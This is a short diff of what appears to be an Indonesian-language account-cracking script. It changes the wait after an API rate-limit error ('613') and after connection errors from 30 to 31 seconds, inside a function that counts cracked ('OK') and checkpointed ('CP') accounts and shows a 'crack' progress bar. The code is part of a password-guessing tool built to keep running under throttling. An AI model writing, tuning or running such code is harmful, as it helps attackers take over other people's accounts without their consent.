@@ -1189,9 +1189,9 @@ def api(idf,pwv,awal):
             elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
                 prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(loop)}/{len(id)} OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}")
                 prog.advance(des)
-                time.sleep(30)
+                time.sleep(31)
             else:continue
-    except requests.exceptions.ConnectionError:time.sleep(30)
+    except requests.exceptions.ConnectionError:time.sleep(31)
 loop+=1
 #--------------------[ METODE reguler ]-----------------#
 def reguler(idf,pwv,awal):
